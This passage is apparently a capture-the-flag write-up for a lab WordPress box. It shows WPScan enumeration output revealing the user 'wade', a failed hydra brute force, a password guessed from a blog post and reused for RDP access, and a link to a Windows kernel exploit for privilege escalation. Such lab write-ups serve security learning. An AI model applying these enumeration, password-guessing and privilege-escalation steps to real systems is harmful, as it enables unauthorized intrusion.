+ | Description: Have you ever wished your WordPress blog looked like an old Geocities site from the 90s!? Probably n...
+ | Author: Organic Themes
+ | Author URI: https://organicthemes.com
+ |
+ | Found By: Css Style In Homepage <span style="color:#f92672">(</span>Passive Detection<span style="color:#f92672">)</span>
+ |
+ | Version: 1.4.10 <span style="color:#f92672">(</span>80% confidence<span style="color:#f92672">)</span>
+ | Found By: Style <span style="color:#f92672">(</span>Passive Detection<span style="color:#f92672">)</span>
+ |  - http://10.10.34.228/retro/wp-content/themes/90s-retro/style.css?ver<span style="color:#f92672">=</span>5.2.1, Match: <span style="color:#e6db74">&#39;Version: 1.4.10&#39;</span>
+
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Enumerating Vulnerable Plugins <span style="color:#f92672">(</span>via Passive Methods<span style="color:#f92672">)</span>
+
+<span style="color:#f92672">[</span>i<span style="color:#f92672">]</span> No plugins Found.
+
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Enumerating Users <span style="color:#f92672">(</span>via Passive and Aggressive Methods<span style="color:#f92672">)</span>
+ Brute Forcing Author IDs - Time: 00:00:06 &lt;<span style="color:#f92672">==============================================================</span>&gt; <span style="color:#f92672">(</span><span style="color:#ae81ff">10</span> / 10<span style="color:#f92672">)</span> 100.00% Time: 00:00:06
+
+<span style="color:#f92672">[</span>i<span style="color:#f92672">]</span> User<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> Identified:
+
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> wade
+ | Found By: Author Posts - Author Pattern <span style="color:#f92672">(</span>Passive Detection<span style="color:#f92672">)</span>
+ | Confirmed By:
+ |  Wp Json Api <span style="color:#f92672">(</span>Aggressive Detection<span style="color:#f92672">)</span>
+ |   - http://10.10.34.228/retro/index.php/wp-json/wp/v2/users/?per_page<span style="color:#f92672">=</span>100&amp;page<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
+ |  Author Id Brute Forcing - Author Pattern <span style="color:#f92672">(</span>Aggressive Detection<span style="color:#f92672">)</span>
+ |  Login Error Messages <span style="color:#f92672">(</span>Aggressive Detection<span style="color:#f92672">)</span>
+
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wade
+ | Found By: Rss Generator <span style="color:#f92672">(</span>Passive Detection<span style="color:#f92672">)</span>
+ | Confirmed By: Login Error Messages <span style="color:#f92672">(</span>Aggressive Detection<span style="color:#f92672">)</span>
+
+<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> No WPScan API Token given, as a result vulnerability data has not been output.
+<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> You can get a free API token with <span style="color:#ae81ff">25</span> daily requests by registering at https://wpscan.com/register
+
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Finished: Wed Jun <span style="color:#ae81ff">22</span> 17:02:17 <span style="color:#ae81ff">2022</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Requests Done: <span style="color:#ae81ff">54</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Cached Requests: <span style="color:#ae81ff">6</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Data Sent: 13.549 KB
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Data Received: 238.983 KB
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Memory used: 247.359 MB
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Elapsed time: 00:00:25
+</code></pre></div><p>User found: <strong>wade</strong></p>
+<p>Tried running hydra with <em>rockyou.txt</em> but did not find anything.
+One of Wade&rsquo;s posts on the wordpress mentions that he mistypes the name of Wade&rsquo;s character avatar, parzival.
+![[Pasted image 20220622173233.png]]
+That worked.</p>
+<p>The credentials worked for logging into wordpress, but that was a rabbit hole. Tried the credentials on the RDP server and got access.</p>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<p>This system is vulnerable to a kernel exploit. <a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/CVE-2017-0213">CVE-2017-0213</a></p>
+<p><img src="/Pasted_image_20220622182919.png" alt="privesc"></p>
 ]]></content>
         </item>
         
